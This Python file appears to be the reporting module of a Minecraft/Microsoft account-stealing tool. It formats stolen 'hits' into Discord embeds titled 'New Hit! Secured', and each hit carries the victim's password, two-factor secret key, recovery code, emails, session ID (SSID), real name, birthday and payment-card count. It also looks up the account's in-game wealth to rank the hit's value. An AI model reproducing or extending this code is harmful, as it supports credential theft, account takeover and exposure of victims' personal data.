from minecraft.get_hypixel import get_hypixel_stats
from minecraft.get_donut import get_donut_stats
from shared.simplify import simplify

from urllib.parse import quote
from discord import Embed
import time

async def build_account_embeds(account: dict, elapsed: float = 0, claim_id: str = "") -> dict:
    name = quote(account["minecraft"]["name"])

    ms = account["microsoft"]
    family = ms["family"]
    devices = ms["devices"]
    cards = ms["cards"]
    subs = ms["subscriptions"]

    info_embed = Embed()
    info_embed.add_field(name="First Name", value=f"```{ms['firstName']}```", inline=True)
    info_embed.add_field(name="Last Name", value=f"```{ms['lastName']}```", inline=True)
    info_embed.add_field(name="Full Name", value=f"```{ms['fullName']}```", inline=False)
    info_embed.add_field(name="Region", value=f"```{ms['region']}```", inline=True)
    info_embed.add_field(name="Birthday", value=f"```{ms['birthday']}```", inline=True)
    info_embed.add_field(name="Language", value=f"```{ms['language']}```", inline=True)
    info_embed.add_field(name="Family Members", value=f"```{len(family) if family else 'None'}```", inline=True)
    info_embed.add_field(name="Devices", value=f"```{len(devices) if devices else 'None'}```", inline=True)
    info_embed.add_field(name="Payment Cards", value=f"```{len(cards) if cards else 'None'}```", inline=True)
    info_embed.add_field(name="Active Subs", value=f"```{len(subs['active']) if subs['active'] else 'None'}```", inline=True)
    info_embed.add_field(name="Canceled Subs", value=f"```{len(subs['canceled']) if subs['canceled'] else 'None'}```", inline=True)
    info_embed.add_field(name="Commercial Subs", value=f"```{len(subs['commercial']) if subs['commercial'] else 'None'}```", inline=True)

    hstats = await get_hypixel_stats(name)
    dstats = await get_donut_stats(name)

    stats_embed = Embed(color=0x279CF5)
    stats_embed.add_field(name="Rank", value=f'{hstats["hypixel"]["rank"]}', inline=True)
    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats["hypixel"]["level"])}', inline=True)
    stats_embed.add_field(name="Gifted", value=f'{hstats["hypixel"]["gifted"]}', inline=True)
    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["skyblock"]["networth"])}', inline=True)
    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["skyblock"]["level"])}', inline=True)
    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)

    xbox_embed = Embed(color=0x107C10, title="Xbox Info")
    xbox_embed.add_field(name="Gamertag", value=f"```{account['minecraft']['gamertag']}```", inline=False)
    xbox_embed.add_field(name="Microsoft Points", value="```N/A```", inline=True)

    hit_embed = Embed(
        title=f"New Hit! Secured in {round(elapsed, 2)}s",
        description=(
            "[Login](https://login.live.com/) | "
            "[Donut](https://www.donutstats.net/player-finder) | "
            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | "
            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) | "
            f"[Is Online](https://hypixel.paniek.de/player/{name}/status)"
        ),
        color=0x279CF5
    )
    hit_embed.add_field(name="MC Username", value=f"```{account['minecraft']['name']}```", inline=False)
    hit_embed.add_field(name="MC Method", value=f"```{account['minecraft']['method']}```", inline=True)
    hit_embed.add_field(name="MC Capes", value=f"```{account['minecraft']['capes']}```", inline=True)
    hit_embed.add_field(name="Primary Email", value=f"```{ms['email']}```", inline=False)
    hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
    hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
    hit_embed.add_field(name="Secret Key", value=f"```{ms['auth_secret']}```", inline=False)
    hit_embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
    hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")

    ssid_embed = Embed(
        title="SSID",
        description=f"```{account['minecraft']['SSID']}```"
    )

    if account["minecraft"]["SSID"]:
        hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/128")

    return {
        "hit_embed": hit_embed,
        "claim_id": claim_id,
        "minecraft": account["minecraft"],
        "details": {
            "stats_embed": stats_embed,
            "ssid_embed": ssid_embed,
            "info_embed": info_embed,
            "xbox_embed": xbox_embed,
            "account_details": (
                f"**Username:** {account['minecraft']['name']}\n"
                f"**Has MC:** {True if account['minecraft']['SSID'] else False}\n"
                f"**Capes:** {account['minecraft']['capes']}\n"
                f"**Email:** {ms['email']}\n"
                f"**Security Email:** {ms['security_email']}\n"
                f"**Password:** {ms['password']}\n"
                f"**Recovery Code:** {ms['recovery_code']}"
            )
        }
    }
